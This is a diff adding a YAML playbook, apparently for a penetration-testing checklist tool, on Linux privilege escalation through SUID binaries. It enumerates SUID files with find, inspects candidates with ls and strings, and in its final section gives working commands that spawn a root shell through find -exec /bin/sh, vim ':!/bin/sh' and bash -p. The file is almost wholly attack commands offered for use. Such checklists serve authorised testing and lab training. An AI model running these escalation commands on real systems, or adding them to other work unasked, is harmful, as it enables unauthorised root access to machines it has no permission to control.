@@ -1,0 +1,75 @@
+name: Linux PrivEsc SUID
+
+steps:
+
+# =========================================================
+# [1] SUID ENUMERATION
+# =========================================================
+- title: SUID Enumeration
+  mode: enum
+  info: |
+    Find binaries running with root privileges.
+
+  entries:
+
+    - cmd: "find / -perm -4000 -type f 2>/dev/null"
+      info: suid files
+      look_for:
+        - unusual binaries
+        - custom paths (/home, /opt, /tmp)
+        - known binaries (find, vim, bash, etc)
+      notes:
+        - focus on non-standard binaries
+        - root-owned suid = high value
+
+
+# =========================================================
+# [2] SUID ANALYSIS
+# =========================================================
+- title: SUID Analysis
+  mode: enum
+  info: |
+    Identify exploitable binaries.
+
+  entries:
+
+    - cmd: "ls -l <binary>"
+      info: check perms
+      look_for:
+        - root ownership
+        - suid bit (rws)
+
+    - cmd: "strings <binary>"
+      info: inspect binary
+      look_for:
+        - system calls
+        - script paths
+        - hardcoded commands
+
+  notes:
+    - lookup binary in GTFOBins (SUID)
+    - custom binaries are often vulnerable
+
+
+# =========================================================
+# [3] SUID EXPLOITATION
+# =========================================================
+- title: SUID Exploitation
+  mode: chain
+  info: |
+    Abuse SUID binary to execute commands as root.
+
+  entries:
+
+    - cmd: "/usr/bin/find . -exec /bin/sh \\; -quit"
+      info: find escape
+
+    - cmd: "/usr/bin/vim -c ':!/bin/sh'"
+      info: vim escape
+
+    - cmd: "/bin/bash -p"
+      info: bash suid shell
+
+  notes:
+    - requires vulnerable or GTFOBins-supported binary
+    - behavior depends on binary implementation
